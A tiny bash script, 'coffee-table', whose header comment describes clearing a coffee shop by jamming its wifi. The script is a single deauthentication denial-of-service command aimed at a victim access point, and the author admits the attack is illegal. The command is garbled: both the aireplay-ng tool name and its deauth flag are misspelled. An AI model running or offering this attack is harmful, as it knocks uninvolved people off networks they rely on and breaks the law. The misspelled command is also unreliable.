#!/bin/bash

##############################################################################
# coffee-table
# -----------
# Isn't it annoying when you can't get a seat at a coffee shop?
#
# Of course it is. Kill the wifi with aircrack-ng and clear the place out.
#
# Now, pull up a chair and enjoy :)
#
# Definitely illegal. Use at your own risk.
#
# Credit to Isis Lovecruft's blog for the DOS attack at the heart of this script:
#
# https://blog.patternsinthevoid.net/broadcast-de-auth-dos-attack-jamming-wifi-networks.html
# 
# :author: greyspectrum
# :date:  July 25 2016
# :version: 0.9.0
##############################################################################

airplay-ng --death 0 -a [BSSID of victim network access point] mon0
